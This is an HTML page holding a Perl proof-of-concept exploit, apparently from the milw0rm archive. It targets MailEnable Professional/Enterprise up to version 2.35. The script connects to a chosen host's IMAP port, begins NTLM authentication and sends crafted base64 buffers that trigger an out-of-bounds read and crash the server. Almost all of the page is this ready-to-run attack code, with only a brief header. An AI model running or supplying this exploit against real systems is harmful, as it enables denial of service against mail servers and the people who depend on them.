<html><head><title>MailEnable Professional/Enterprise <= 2.35 Out of Bounds DoS Exploit</title></head><pre>#!/usr/bin/perl
#
# maildisable-v5.pl
#
# Mail Enable Professional/Enterprise &lt;=v2.35 (win32)
# by mu-b - Wed Nov 29 2006
#
# - Tested on: Mail Enable Professional v2.32 (win32) - with HOTFIX
#              Mail Enable Professional v2.33 (win32)
#              Mail Enable Professional v2.34 (win32)
#              Mail Enable Professional v2.35 (win32)
#
# out of bounds read == DoS
#
########

use Getopt::Std; getopts('t:', \%arg);
use Socket;
use MIME::Base64;

&amp;print_header;

my $target;

if (defined($arg{'t'})) { $target = $arg{'t'} }
if (!(defined($target))) { &amp;usage; }

my $imapd_port = 143;
my $send_delay = 2;

my $PAD = 'A';

if (connect_host($target, $imapd_port)) {
    print(&quot;-&gt; * Connected\n&quot;);
    send(SOCKET, &quot;1 AUTHENTICATE NTLM\r\n&quot;, 0);
    sleep($send_delay);

    $buf = ($PAD x 12).
           &quot;\xfa\xff\xff\xff&quot;.
           ($PAD x 12);
    send(SOCKET, encode_base64($buf).&quot;\r\n&quot;, 0);
    sleep($send_delay);

    $buf = ($PAD x 28).
           &quot;\x00\x01&quot;.
           ($PAD x 2).
           &quot;\xef\xbe\xad\xde&quot;;
    send(SOCKET, encode_base64($buf).&quot;\r\n&quot;, 0);
    sleep($send_delay);

    print(&quot;-&gt; * Successfully sent payload!\n&quot;);
}

sub print_header {
    print(&quot;MailEnable Pro &lt;=v2.36 DoS POC\n&quot;);
    print(&quot;by: &lt;mu-b\@digit-labs.org&gt;\n\n&quot;);
}

sub usage {
  print(qq(Usage: $0 -t &lt;hostname&gt;

     -t &lt;hostname&gt;    : hostname to test
));

    exit(1);
}

sub connect_host {
    ($target, $port) = @_;
    $iaddr  = inet_aton($target)                 || die(&quot;Error: $!\n&quot;);
    $paddr  = sockaddr_in($port, $iaddr)         || die(&quot;Error: $!\n&quot;);
    $proto  = getprotobyname('tcp')              || die(&quot;Error: $!\n&quot;);

    socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die(&quot;Error: $!\n&quot;);
    connect(SOCKET, $paddr)                      || die(&quot;Error: $!\n&quot;);
    return(1338);
}

# milw0rm.com [2007-02-14]</pre></html>